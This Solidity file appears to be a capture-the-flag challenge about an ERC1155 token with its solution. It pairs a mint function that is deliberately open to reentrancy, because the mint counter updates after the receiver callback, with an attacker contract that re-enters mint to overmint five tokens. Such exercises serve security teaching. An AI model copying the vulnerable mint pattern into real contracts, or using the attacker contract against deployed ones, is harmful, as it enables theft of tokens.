// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.20;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;

    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    Overmint1_ERC1155 victimContract;
    uint256 public counter;
    address owner;

    constructor(address _victimContractAddress) {
        victimContract = Overmint1_ERC1155(_victimContractAddress);
        owner = msg.sender;
    }

    function attack() public {
        victimContract.mint(0, "");
        victimContract.safeTransferFrom(address(this), owner, 0, 5, "");
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory)
        public
        virtual
        override
        returns (bytes4)
    {
        if (counter < 4) {
            unchecked {
                counter++;
            }

            victimContract.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}
